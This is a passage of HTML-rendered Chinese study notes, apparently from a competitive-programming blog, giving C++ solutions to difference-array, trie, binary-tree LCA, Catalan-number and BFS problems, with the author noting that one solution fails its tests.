class="number">1</span>)</span></span>;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">d</span><span class="params">(n+<span class="number">2</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"><span class="type">int</span> l, r;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line">l++;</span><br><span class="line">r++;</span><br><span class="line">d[l]--;</span><br><span class="line">d[r+<span class="number">1</span>]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n+<span class="number">2</span>; i++)&#123;</span><br><span class="line">a[i] = d[i] + a[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n+<span class="number">2</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] &gt; <span class="number">0</span>)</span><br><span class="line">cnt ++;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了被改的区域一直--外，其他区域都恒为1</p><h3 id="刷出一道墙">刷出一道墙</h3><h5 id="题目描述-26">题目描述</h5><p>在一面很长的墙壁上，工人们用不同的油漆去刷墙，然而可能有些地方刷过以后觉得不好看，他们会重新刷一下。有些部分因为重复刷了很多次覆盖了很多层油漆，小诺很好奇那些地方被刷过多少种颜色的油漆。</p><h5 id="输入输出格式-24">输入输出格式</h5><h6 id="输入描述-26">输入描述:</h6><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">若干行输入，每行两个数字B<span class="comment">[i]</span>,E<span class="comment">[i]</span>(0&lt;=B<span class="comment">[i]</span>&lt;=E<span class="comment">[i]</span>&lt;=200000)表示这次刷的墙壁是哪一段</span><br><span class="line">（假设每次刷的时候油漆颜色都和之前的不同），以0 0结束</span><br><span class="line">又若干行输入，每行两个数字begin<span class="comment">[i]</span>,end<span class="comment">[i]</span>（0&lt;=begin<span class="comment">[i]</span>&lt;=end<span class="comment">[i]</span>&lt;=200000）表示小诺询问的段，</span><br><span class="line">以0 0结束</span><br></pre></td></tr></table></figure><h6 id="输出描述-26">输出描述:</h6><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于每个小诺的询问输出(<span class="keyword">end</span>[i]-<span class="keyword">begin</span>[i]+<span class="number">1</span>)行,表示对应询问段的每个点被多少种颜色的油漆覆盖过。</span><br></pre></td></tr></table></figure><p>还是差分数组，不知道为啥我的一直过不了~试了改scanf和去掉cout的缓冲区都不行</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> l, r, m = <span class="number">0</span>;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(<span class="number">20005</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">d</span><span class="params">(<span class="number">20005</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;l, &amp;r) != EOF)&#123;</span><br><span class="line"><span class="keyword">if</span>(l == <span class="number">0</span> &amp;&amp; r == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">l++;</span><br><span class="line">r++;</span><br><span class="line">d[l]++;</span><br><span class="line">d[r+<span class="number">1</span>]--;</span><br><span class="line">m = <span class="built_in">max</span>(r, m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; i++)&#123;</span><br><span class="line">a[i] = d[i] + a[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;l, &amp;r) != EOF)&#123;</span><br><span class="line"><span class="keyword">if</span>(l == <span class="number">0</span> &amp;&amp; r == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">l++;</span><br><span class="line">r++;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = l; i &lt;= r; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="前缀树">前缀树</h2><h3 id="前缀字符串">前缀字符串</h3><h5 id="题目描述-27">题目描述</h5><p>如果一个字符串s1是由另一个字符串s2的前面部分连续字符组成的，那么我们就说s1就是s2的前缀。比如“ac”是“acm”的前缀，“abcd”是“abcddfasf”的前缀，特别的“kdfa”是“kdfa”的前缀。现在给你一些字符串，你的任务就是从这些字符串中找出一些字符串放到一个集合中，使得这个集合中任意一个字符串不是其他字符串的前缀，并且要使集合里的字符串尽可能的多。输出这个集合中字符串的个数。</p><h5 id="输入输出格式-25">输入输出格式</h5><h6 id="输入描述-27">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">有多组测试数据。每组测试数据以一个整数<span class="built_in">n</span>开头，随后有<span class="built_in">n</span>个字符串。 当<span class="built_in">n</span>=<span class="number">0</span>时表示输入结束。</span><br><span class="line"><span class="number">0</span>&lt;<span class="built_in">n</span>&lt;<span class="number">100</span>，字符串长度不大于<span class="number">20</span>。</span><br></pre></td></tr></table></figure><h6 id="输出描述-27">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每组测试数据输出一个整数，即所求的最大值。每组数据占一行。</span><br></pre></td></tr></table></figure><p>构建一颗前缀树，求它的叶子节点个数即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">26</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line"><span class="type">int</span> ct;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *next[maxn];</span><br><span class="line">&#125; *Tree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initTree</span><span class="params">(Tree &amp;r)</span></span>&#123;</span><br><span class="line">r-&gt;ct = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; maxn; i++)&#123;</span><br><span class="line">r-&gt;next[i] = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">buildTree</span><span class="params">(Tree &amp;r, string s)</span></span>&#123;</span><br><span class="line">Tree p = r, q;</span><br><span class="line"><span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="type">int</span> k = s[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;next[k] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">q = <span class="keyword">new</span> node;</span><br><span class="line">q-&gt;ct = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; maxn; j++)&#123;</span><br><span class="line">q-&gt;next[j] = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">p-&gt;next[k] = q;</span><br><span class="line">p = p-&gt;next[k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">p-&gt;next[k]-&gt;ct++;</span><br><span class="line">p = p-&gt;next[k];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">countTree</span><span class="params">(Tree r)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">queue&lt;Tree&gt; q;</span><br><span class="line">q.<span class="built_in">push</span>(r);</span><br><span class="line"><span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">Tree p = q.<span class="built_in">front</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; maxn; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;next[i] == <span class="literal">NULL</span>) tmp++;</span><br><span class="line"><span class="keyword">else</span> q.<span class="built_in">push</span>(p-&gt;next[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(tmp == maxn) sum++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">Tree root = <span class="keyword">new</span> node;</span><br><span class="line"><span class="built_in">initTree</span>(root);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">string s;</span><br><span class="line">cin &gt;&gt; s;</span><br><span class="line"><span class="built_in">buildTree</span>(root, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sum = <span class="built_in">countTree</span>(root);</span><br><span class="line">cout &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这题的数据量很小，我们也可以用map来搞定，记得每次存长度最大的那个</p><h3 id="北邮2019-二叉树">北邮2019 二叉树</h3><h5 id="题目描述-28">题目描述</h5><p>对二叉树，计算任意两个结点的最短路径长度。</p><h5 id="输入输出格式-26">输入输出格式</h5><h6 id="输入描述-28">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一行输入测试数据组数 <span class="built_in">T</span></span><br><span class="line">第二行输入 <span class="built_in">n</span> , m 。 <span class="built_in">n</span> 代表输入的数据组数， m 代表要查询的数据组数。</span><br><span class="line">接下来 <span class="built_in">n</span> 行，每行输入两个数，代表<span class="number">1</span>~ <span class="built_in">n</span> 结点的孩子结点，如果没有孩子结点则输入-<span class="number">1</span>，根节点为<span class="number">1</span>。</span><br><span class="line">接下来 m 行，每行输入两个数，代表要查询的两个结点。</span><br></pre></td></tr></table></figure><h6 id="输出描述-28">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每组测试数据输出 m 行，代表查询的两个结点之间的最短路径长度。</span><br></pre></td></tr></table></figure><p>找最小公共祖先</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">10000</span>;</span><br><span class="line"><span class="type">int</span> f[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findminipath</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line"><span class="keyword">while</span>(f[a] != <span class="number">1</span>)&#123;</span><br><span class="line">res.<span class="built_in">push_back</span>(a);</span><br><span class="line">a = f[a];</span><br><span class="line">&#125;</span><br><span class="line">res.<span class="built_in">push_back</span>(a);</span><br><span class="line"><span class="keyword">if</span>(a != <span class="number">1</span>) res.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> t, n, m;</span><br><span class="line">cin &gt;&gt; t;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; i++)&#123;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">f[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> l, r;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line"><span class="keyword">if</span>(l != <span class="number">-1</span>)&#123;</span><br><span class="line">f[l] = j+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(r != <span class="number">-1</span>)&#123;</span><br><span class="line">f[r] = j+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; lp = <span class="built_in">findminipath</span>(l);</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; rp = <span class="built_in">findminipath</span>(r);</span><br><span class="line"><span class="type">int</span> idx1=lp.<span class="built_in">size</span>() - <span class="number">1</span>, idx2 = rp.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(;idx1&gt;=<span class="number">0</span>, idx2&gt;=<span class="number">0</span>; idx1--, idx2--)&#123;</span><br><span class="line"><span class="keyword">if</span>(lp[idx1] != rp[idx2])&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; idx1+idx2+<span class="number">2</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="有向树形态">有向树形态</h3><h5 id="题目描述-29">题目描述</h5><p>求N个结点能够组成的二叉树的个数。 1&lt;=n&lt;=20</p><h5 id="输入输出格式-27">输入输出格式</h5><h6 id="输入描述-29">输入描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">见题目</span><br></pre></td></tr></table></figure><h6 id="输出描述-29">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">见题目</span><br></pre></td></tr></table></figure><p>卡特兰数，n较小直接递推，加上记忆化搜索</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> a[<span class="number">25</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line">a[<span class="number">0</span>] = <span class="number">1</span>, a[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line">ans += a[j] * a[i-j<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line">a[i] = ans;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; a[n] &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="南京理工-树的高度">南京理工-树的高度</h3><h5 id="题目描述-30">题目描述</h5><p>树是一种特殊的图结构，有根树是一个有固定根的树。现在给定一棵有根树，编程求出树中所有节点到指定的根节点最远距离。</p><h5 id="输入输出格式-28">输入输出格式</h5><h6 id="输入描述-30">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一行是两个整数<span class="built_in">N</span>，M（<span class="number">1</span>&lt;=<span class="built_in">N</span>&lt;=<span class="number">10000</span>,<span class="number">1</span>&lt;=M&lt;=<span class="built_in">N</span>），表示数的顶点数和根节点的编号，接下来<span class="built_in">N</span>-<span class="number">1</span>行，每行两个整数u,v（<span class="number">1</span>&lt;=u,v&lt;=<span class="built_in">N</span>），表示编号为u的节点和编号为v的节点间有一条边。</span><br></pre></td></tr></table></figure><h6 id="输出描述-30">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出距离根节点最远的点到根的距离。</span><br></pre></td></tr></table></figure><p>BFS算法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;edge;</span><br><span class="line"><span class="type">int</span> deep;</span><br><span class="line"><span class="type">bool</span> visit;</span><br><span class="line"></span><br><span class="line"><span class="built_in">node</span>()&#123;</span><br><span class="line">deep = <span class="number">0</span>;</span><br><span class="line">visit = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">node nod[<span class="number">10000</span>];</span><br><span class="line">queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> u, v;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++)&#123;</span><br><span class="line">cin &gt;&gt; u &gt;&gt; v;</span><br><span class="line">nod[u].edge.<span class="built_in">push_back</span>(v);</span><br><span class="line">nod[v].edge.<span class="built_in">push_back</span>(u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> max = <span class="number">1</span>;</span><br><span class="line">nod[m].deep = <span class="number">1</span>;</span><br><span class="line">nod[m].visit = <span class="literal">true</span>;</span><br><span class="line">q.<span class="built_in">push</span>(m);</span><br><span class="line"><span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="type">int</span> now = q.<span class="built_in">front</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; nod[now].edge.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!nod[nod[now].edge[i]].visit)&#123;</span><br><span class="line">nod[nod[now].edge[i]].visit = <span class="literal">true</span>;</span><br><span class="line">nod[nod[now].edge[i]].deep = nod[now].deep + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(max &lt; nod[nod[now].edge[i]].deep) max = nod[nod[now].edge[i]].deep;</span><br><span class="line">q.<span class="built_in">push</span>(nod[now].edge[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; max - <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h1 id="搜索">搜索</h1><h3 id="迷宫">迷宫</h3><h5 id="题目描述-31">题目描述</h5><p>Time Limit: 1000 ms Memory Limit: 256 mb</p><p>小 A 同学现在被困在了一个迷宫里面，他很想从迷宫中走出来，他可以向上、向下、向左、向右移动、每移动一格都需要花费 1 秒的时间，不能够走到边界之外。假设小 A 现在的位置在 S，迷宫的出口在 E，迷宫可能有多个出口。问小 A 想要走到迷宫出口最少需要花费多少秒？</p><h5 id="输入输出格式-29">输入输出格式</h5><h6 id="输入描述-31">输入描述:</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">有多组测试数据。</span><br><span class="line">第一行输入两个正整数 <span class="built_in">H</span>（<span class="number">0</span> &lt; <span class="built_in">H</span> &lt;= <span class="number">100</span>）和 W（<span class="number">0</span> &lt; W &lt;= <span class="number">100</span>），分别表示迷</span><br><span class="line">宫的高和宽。</span><br><span class="line">接下来 <span class="built_in">H</span> 行，每行 W 个字符（其中‘*’表示路，‘<span class="comment">#’表示墙，‘S’表示小 A</span></span><br><span class="line">的位置，‘E’表示迷宫出口）。</span><br><span class="line">当 <span class="built_in">H</span> 与 W 都等于 <span class="number">0</span> 时程序结束。</span><br></pre></td></tr></table></figure><h6 id="输出描述-31">输出描述:</h6><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出小 <span class="selector-tag">A</span> 走到迷宫出口最少需要花费多少秒，如果永远无法走到出口则输出“-<span class="number">1</span>”。</span><br></pre></td></tr></table></figure><p>BFS，注意struct的初始化</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 